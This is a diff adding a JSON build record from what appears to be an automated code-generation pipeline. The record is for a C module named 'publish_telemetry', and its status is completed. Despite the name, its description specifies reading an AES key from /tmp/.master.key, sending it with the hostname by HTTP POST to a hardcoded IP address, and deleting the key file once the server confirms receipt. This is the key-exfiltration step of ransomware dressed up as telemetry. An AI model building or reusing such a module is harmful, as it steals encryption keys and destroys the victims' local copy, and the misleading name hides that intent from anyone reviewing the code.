@@ -1,0 +1,13 @@
+{
+  "code_lines": 180,
+  "code_path": "modules/publish_telemetry.c",
+  "code_sha256": "f121945f305d3c183e0d47fc3baa1c43a2d77f545a407691d11de75fe6977e48",
+  "description": "Read /tmp/.master.key via fopen/fread, extract aes_key value using strstr(buf, \"\\\"aes_key\\\":\\\"\") and strchr() for closing quote (advance by strlen(\"\\\"aes_key\\\":\\\"\"), validate length > 0. Obtain hostname via gethostname(). Construct JSON body {\"aes_key\":\"<value>\",\"hostname\":\"<hostname>\"}. Send HTTP POST via libcurl to http://10.254.19.73:8080/collect with Content-Type: application/json. If HTTP response status is 200, delete /tmp/.master.key via remove().",
+  "duration_seconds": 63.599657,
+  "finished_at": "2026-09-23T02:11:47.025+00:00",
+  "index": 5,
+  "name": "publish_telemetry",
+  "prompt_path": "modules/05_publish_telemetry/prompt.txt",
+  "started_at": "2026-09-23T02:10:43.426+00:00",
+  "status": "completed"
+}
